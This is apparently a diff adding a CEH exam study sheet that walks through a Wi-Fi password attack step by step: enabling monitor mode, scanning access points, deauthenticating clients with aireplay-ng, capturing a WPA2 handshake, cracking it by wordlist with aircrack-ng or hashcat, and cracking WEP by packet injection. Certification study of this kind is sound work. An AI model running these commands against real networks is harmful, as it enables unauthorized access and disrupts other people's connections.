@@ -1,0 +1,127 @@
+🔹 PHASE 1: Preparation
+1️⃣ Check wireless adapter
+iwconfig
+
+
+✔️ Adapter should support monitor mode
+Example:
+
+wlan0  IEEE 802.11
+
+2️⃣ Kill conflicting processes
+sudo airmon-ng check kill
+
+
+✔️ Stops NetworkManager, wpa_supplicant
+
+3️⃣ Enable Monitor Mode
+sudo airmon-ng start wlan0
+
+
+✔️ New interface created:
+
+wlan0mon
+
+🔹 PHASE 2: Discover Wi-Fi Networks
+4️⃣ Scan nearby APs
+sudo airodump-ng wlan0mon
+
+You will see:
+
+BSSID → Router MAC
+
+CH → Channel
+
+ENC → WEP / WPA / WPA2
+
+ESSID → Wi-Fi name
+
+📌 Note target:
+
+BSSID
+
+Channel
+
+Encryption
+
+🔹 PHASE 3: Capture Handshake (WPA/WPA2)
+5️⃣ Focus on target AP
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+
+✔️ This writes:
+
+capture-01.cap
+
+6️⃣ Force client to reconnect (Deauth)
+sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+
+✔️ When client reconnects → Handshake captured
+
+📌 Look for:
+
+WPA handshake: AA:BB:CC:DD:EE:FF
+
+🔹 PHASE 4: Crack the Password
+7️⃣ Use Wordlist Attack
+sudo aircrack-ng -w rockyou.txt capture-01.cap
+
+Output:
+KEY FOUND! [ password123 ]
+
+
+📌 This is your answer in CEH
+
+🔹 Alternative (Hashcat – Exam Favorite)
+8️⃣ Convert cap → hccapx
+cap2hccapx capture-01.cap wifi.hccapx
+
+9️⃣ Crack with Hashcat
+hashcat -m 2500 wifi.hccapx rockyou.txt
+
+🔹 WEP Network (Quick)
+Capture IVs
+airodump-ng wlan0mon
+
+Inject traffic
+aireplay-ng -3 -b BSSID wlan0mon
+
+Crack
+aircrack-ng capture-01.cap
+
+🔹 CEH PRACTICAL QUESTION STYLE
+Q:
+
+Crack WPA2 Wi-Fi password of target network
+
+Expected Answer Format:
+Tool: airodump-ng, aireplay-ng, aircrack-ng
+Attack: WPA2 handshake capture + dictionary attack
+Password: password123
+
+🔹 COMMON CEH MISTAKES ❌
+
+❌ Forgetting monitor mode
+❌ Wrong channel
+❌ Not capturing handshake
+❌ Using wrong interface (wlan0 instead of wlan0mon)
+
+🔹 QUICK MEMORY FLOW 🧠
+iwconfig
+↓
+airmon-ng start
+↓
+airodump-ng
+↓
+aireplay-ng
+↓
+aircrack-ng
+
+🔹 Tools You MUST Remember for CEH
+Tool	Purpose
+airmon-ng	Monitor mode
+airodump-ng	Capture packets
+aireplay-ng	Deauth attack
+aircrack-ng	Crack password
+hashcat	Faster cracking
